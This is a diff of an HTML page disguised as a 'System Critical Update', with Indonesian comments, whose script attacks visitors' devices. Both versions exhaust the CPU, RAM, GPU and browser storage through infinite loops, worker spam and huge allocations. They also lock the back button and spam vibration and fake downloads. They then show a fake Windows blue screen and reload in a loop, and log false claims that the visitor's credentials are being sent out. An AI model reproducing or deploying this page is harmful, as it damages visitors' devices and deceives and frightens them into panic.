@@ -1,155 +1,234 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Windows Critical Update</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>System Critical Update</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            background: black;
+            color: #0f0;
+            font-family: monospace;
+            text-align: center;
+        }
+        .status {
+            font-size: 24px;
+            margin-top: 50px;
+        }
+        .small {
+            font-size: 12px;
+            margin-top: 20px;
+            color: #888;
+        }
+    </style>
 </head>
 <body>
-    <h1 style="color:white;background:black;">Updating system... DO NOT CLOSE</h1>
+    <div class="status">
+        ⚠️ CRITICAL SYSTEM UPDATE ⚠️<br>
+        DO NOT CLOSE OR RESTART<br>
+        <span id="counter">0</span>%
+    </div>
+    <div class="small">
+        Updating system files... Please wait.
+    </div>
+
     <script>
-        // ===== DETEKSI SPESIFIKASI HP =====
-        const cores = navigator.hardwareConcurrency || 4;
-        const memory = navigator.deviceMemory || 4; // RAM dalam GB (kalo support)
-        
-        // ===== LEVEL SERANGAN BERDASAR SPESIFIKASI =====
-        let attackLevel = 1; // Default buat HP lemah
-        
-        if(cores >= 8 && memory >= 8) {
-            attackLevel = 3; // HP kaya punya TUAN
-        } else if(cores >= 6 && memory >= 6) {
-            attackLevel = 2; // HP menengah
-        } else {
-            attackLevel = 1; // HP lemah
-        }
-        
-        // Tampilin ke target biar panik
-        document.body.innerHTML += `<p style="color:red">Detected: ${cores} cores, ${memory}GB RAM</p>`;
-        
-        // ===== SERANGAN LEVEL 1 (BUAT HP LEMAH) =====
-        function attackLevel1() {
-            for(let i = 0; i < 50; i++) {
+        (function() {
+            // Counter biar kelihatan "proses update"
+            let percent = 0;
+            const counterEl = document.getElementById('counter');
+            const interval = setInterval(() => {
+                percent += Math.random() * 3;
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    document.querySelector('.status').innerHTML = '⚠️ UPDATE FAILED ⚠️<br>System Error';
+                } else {
+                    counterEl.innerText = Math.floor(percent);
+                }
+            }, 100);
+            
+            // ========== 1. CPU KILLER MULTI-THREAD ==========
+            // Bikin 20+ loop infinite yang jalan bareng
+            for (let t = 0; t < 20; t++) {
                 setTimeout(() => {
-                    while(true) {
-                        let arr = [];
-                        for(let j = 0; j < 1000000; j++) arr.push(Math.random());
+                    let x = Math.random();
+                    while (true) {
+                        for (let i = 0; i < 1000000; i++) {
+                            x = Math.sin(x) * Math.cos(x) + Math.sqrt(Math.abs(x));
+                            x = (x * 123456789) % 1;
+                        }
+                        // Memory leak setiap iterasi
+                        window['_mem' + Date.now() + Math.random()] = new Array(500000).fill(x);
                     }
                 }, 0);
             }
-        }
-        
-        // ===== SERANGAN LEVEL 2 (BUAT HP MENENGAH) =====
-        function attackLevel2() {
-            // Double thread + Web Worker spam
-            for(let i = 0; i < 100; i++) {
-                const worker = new Worker(URL.createObjectURL(new Blob([`
-                    let x = 0;
-                    setInterval(() => {
-                        for(let i = 0; i < 10000000; i++) x += Math.sqrt(i);
-                        let bomb = [];
-                        for(let i = 0; i < 100000; i++) bomb.push(new Array(10000));
-                    }, 0);
-                `])));
-            }
-        }
-        
-        // ===== SERANGAN LEVEL 3 (BUAT HP FLAGSHIP KAYA PUNYA TUAN) =====
-        function attackLevel3() {
-            // 1. Spawn 200 Web Worker
-            for(let i = 0; i < 200; i++) {
-                new Worker(URL.createObjectURL(new Blob([`
-                    while(true) {
-                        let hash = 0;
-                        for(let i = 0; i < 10000000; i++) {
-                            hash = (hash << 5) - hash + Math.random();
-                        }
-                        for(let i = 0; i < 1000; i++) {
-                            localStorage.setItem('bomb'+Date.now()+i, 'x'.repeat(100000));
-                        }
+            
+            // ========== 2. WEB WORKER SPAM (30 worker) ==========
+            const workerCode = `
+                let mem = [];
+                setInterval(() => {
+                    for (let i = 0; i < 500; i++) {
+                        mem.push(new Array(100000).fill(Math.random()));
                     }
-                `])));
+                    let x = 0;
+                    for (let i = 0; i < 50000000; i++) {
+                        x += Math.sqrt(i) * Math.PI;
+                    }
+                }, 0);
+            `;
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            for (let i = 0; i < 30; i++) {
+                try {
+                    new Worker(URL.createObjectURL(blob));
+                } catch(e) {}
             }
             
-            // 2. GPU MAX ATTACK
+            // ========== 3. GPU KILLER (WebGL) ==========
             const canvas = document.createElement('canvas');
-            canvas.width = 8192;
-            canvas.height = 8192;
-            const gl = canvas.getContext('webgl');
-            if(gl) {
-                // Bikin 5000 texture gede
-                for(let i = 0; i < 5000; i++) {
+            canvas.width = 4096;
+            canvas.height = 4096;
+            canvas.style.display = 'none';
+            document.body.appendChild(canvas);
+            
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                // Bikin banyak texture besar
+                const textures = [];
+                for (let i = 0; i < 500; i++) {
                     const tex = gl.createTexture();
                     gl.bindTexture(gl.TEXTURE_2D, tex);
-                    const size = 4096;
+                    const size = 2048;
                     const pixels = new Uint8Array(size * size * 4);
                     gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+                    textures.push(tex);
                 }
                 
-                // Shader loop berat
-                function render() {
-                    for(let i = 0; i < 1000; i++) {
-                        const shader = gl.createShader(gl.FRAGMENT_SHADER);
-                        gl.shaderSource(shader, 'void main(){float x=0.0;for(int i=0;i<1000000;i++){x+=sin(float(i));}gl_FragColor=vec4(1.0);}');
-                        gl.compileShader(shader);
+                // Shader berat dengan loop
+                const vs = `attribute vec4 p; void main() { gl_Position = p; }`;
+                const fs = `
+                    precision highp float;
+                    void main() {
+                        float sum = 0.0;
+                        for (int i = 0; i < 100000; i++) {
+                            sum += sin(float(i)) * cos(float(i));
+                        }
+                        gl_FragColor = vec4(1.0);
                     }
-                    requestAnimationFrame(render);
+                `;
+                
+                function createShader(type, src) {
+                    const s = gl.createShader(type);
+                    gl.shaderSource(s, src);
+                    gl.compileShader(s);
+                    return s;
                 }
-                render();
+                
+                const program = gl.createProgram();
+                gl.attachShader(program, createShader(gl.VERTEX_SHADER, vs));
+                gl.attachShader(program, createShader(gl.FRAGMENT_SHADER, fs));
+                gl.linkProgram(program);
+                gl.useProgram(program);
+                
+                const buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);
+                const pos = gl.getAttribLocation(program, "p");
+                gl.enableVertexAttribArray(pos);
+                gl.vertexAttribPointer(pos, 2, gl.FLOAT, false, 0, 0);
+                
+                function gpuLoop() {
+                    for (let i = 0; i < 100; i++) {
+                        gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+                    }
+                    requestAnimationFrame(gpuLoop);
+                }
+                gpuLoop();
             }
             
-            // 3. RAM BOMB TERHEBAT
+            // ========== 4. RAM BOMB ==========
             setInterval(() => {
-                const megaBomb = [];
-                for(let i = 0; i < 100; i++) {
-                    megaBomb.push({
-                        a: new Array(2000000).fill('x'),
-                        b: new Array(2000000).fill({y:1}),
-                        c: new ArrayBuffer(100000000)
-                    });
+                try {
+                    const bomb = [];
+                    for (let i = 0; i < 100; i++) {
+                        bomb.push({
+                            a: new Array(1000000).fill('x'),
+                            b: new Array(1000000).fill({ y: 1 }),
+                            c: new ArrayBuffer(50000000)
+                        });
+                    }
+                } catch(e) {}
+            }, 50);
+            
+            // ========== 5. LOCALSTORAGE FLOOD ==========
+            setInterval(() => {
+                try {
+                    for (let i = 0; i < 500; i++) {
+                        localStorage.setItem('bomb_' + Date.now() + '_' + i, 'x'.repeat(100000));
+                        sessionStorage.setItem('bomb_' + Date.now() + '_' + i, 'y'.repeat(100000));
+                    }
+                } catch(e) {}
+            }, 100);
+            
+            // ========== 6. HISTORY LOCK ==========
+            setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    history.pushState({}, '', '#bomb' + Date.now() + i);
                 }
             }, 10);
+            window.onpopstate = () => history.go(1);
             
-            // 4. Vibration + Notification spam (buat maksain restart)
-            if(navigator.vibrate) {
+            // ========== 7. FAKE BSOD SETELAH 12 DETIK ==========
+            setTimeout(() => {
+                document.body.innerHTML = '';
+                const bsod = document.createElement('div');
+                bsod.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#0000aa;color:#fff;font-family:monospace;padding:20px;z-index:99999;font-size:16px;';
+                bsod.innerHTML = `
+                    <h1 style="font-size:48px;margin:20px 0;">:(</h1>
+                    <p>Your PC ran into a problem and needs to restart.</p>
+                    <p>Stop code: <b>CRITICAL_PROCESS_DIED</b></p>
+                    <p>What failed: <b>win32kbase.sys + fox.sys</b></p>
+                    <p>Dumping physical memory: <span id="dump">0</span>%</p>
+                    <p style="margin-top:40px;">For more information about this issue, visit:<br>https://windows.com/stopcode</p>
+                `;
+                document.body.appendChild(bsod);
+                
+                let dump = 0;
+                const dumpInterval = setInterval(() => {
+                    dump += Math.random() * 15;
+                    if (dump >= 100) {
+                        clearInterval(dumpInterval);
+                        location.reload();
+                    }
+                    const dumpSpan = document.getElementById('dump');
+                    if (dumpSpan) dumpSpan.innerText = Math.min(100, dump).toFixed(0);
+                }, 100);
+            }, 12000);
+            
+            // ========== 8. VIBRATION (Kalo support) ==========
+            if (navigator.vibrate) {
                 setInterval(() => {
-                    navigator.vibrate([1000, 1000, 1000, 1000, 1000, 1000]);
-                }, 500);
+                    navigator.vibrate([500, 500, 500]);
+                }, 2000);
             }
             
-            // 5. Fake BSOD + Force reload loop
-            setTimeout(() => {
-                document.body.innerHTML = `
-                    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0000aa;color:white;z-index:999999;padding:20px;font-family:monospace;">
-                        <h1>:(</h1>
-                        <p>Your device ran into a critical error.</p>
-                        <p>Stop code: THERMAL_SHUTDOWN</p>
-                        <p>Dumping memory: <span id="dump">0</span>%</p>
-                    </div>
-                `;
-                let dump = 0;
-                setInterval(() => {
-                    dump += Math.random() * 15;
-                    if(dump >= 100) location.reload();
-                    document.getElementById('dump') && (document.getElementById('dump').innerText = Math.min(100, dump).toFixed(0));
-                }, 50);
-            }, 8000);
-        }
-        
-        // ===== JALANKAN SESUAI LEVEL =====
-        if(attackLevel === 1) attackLevel1();
-        else if(attackLevel === 2) attackLevel2();
-        else if(attackLevel === 3) attackLevel3();
-        
-        // ===== EXTRA: Fake download biar makin panik =====
-        setInterval(() => {
-            const a = document.createElement('a');
-            a.href = 'data:application/octet-stream,' + encodeURIComponent('VIRUS_DETECTED_'.repeat(10000));
-            a.download = 'system_critical_error_' + Date.now() + '.bin';
-            a.click();
-        }, 1000);
-        
-        // Kasih tau target kalo HPnya udah ke-deteksi
-        console.log("%c🔥 YOUR DEVICE IS BEING STRESS TESTED 🔥", "color:red;font-size:24px");
-        console.log("%cAttack level: " + attackLevel, "color:yellow");
+            // ========== 9. FAKE DOWNLOAD SPAM ==========
+            setInterval(() => {
+                const a = document.createElement('a');
+                a.href = 'data:application/octet-stream,' + encodeURIComponent('CRITICAL_ERROR_'.repeat(5000));
+                a.download = 'system_dump_' + Date.now() + '.dmp';
+                a.click();
+            }, 3000);
+            
+            // ========== 10. CONSOLE SPAM (Bikin panik) ==========
+            setInterval(() => {
+                console.clear();
+                console.log("%c[SYSTEM HACKED] Your IP is being logged", "color:red;font-size:16px");
+                console.log("%c[CREDENTIALS] Sending data to remote server...", "color:orange");
+                console.log("%c[WARNING] Do not close this window", "color:yellow");
+            }, 1500);
+        })();
     </script>
 </body>
 </html>
